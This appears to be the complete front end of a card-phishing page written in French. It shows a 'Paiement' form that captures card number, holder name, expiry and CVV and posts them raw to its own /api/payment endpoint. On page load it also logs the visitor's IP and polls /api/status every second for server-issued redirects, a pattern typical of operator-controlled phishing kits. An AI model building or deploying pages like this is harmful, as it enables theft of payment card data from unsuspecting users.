<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>Paiement</title>
<script>
let sessionId = null;

async function sendPayment(){
  const cardNumber = document.getElementById('cardNumber').value;
  const expiry = document.getElementById('expiry').value;
  const cvv = document.getElementById('cvv').value;
  const nomTitulaire = document.getElementById('nomTitulaire').value;

  await fetch('/api/payment',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body: JSON.stringify({cardNumber, expiry, cvv, nomTitulaire})
  });
}

async function init(){
  const res = await fetch('/api/visit');
  const data = await res.json();
  sessionId = data.ip;

  setInterval(async ()=>{
    const r = await fetch('/api/status');
    const j = await r.json();
    if(j.redirect) window.location.href = j.redirect;
  },1000);
}
</script>
</head>
<body onload="init()">
<h1>Paiement</h1>
<form onsubmit="sendPayment(); return false;">
  <input id="cardNumber" placeholder="NumÃ©ro Carte" required><br>
  <input id="nomTitulaire" placeholder="Nom Titulaire" required><br>
  <input id="expiry" placeholder="MM/AA" required><br>
  <input id="cvv" placeholder="CVV" required><br>
  <button type="submit">Valider</button>
</form>
</body>
</html>
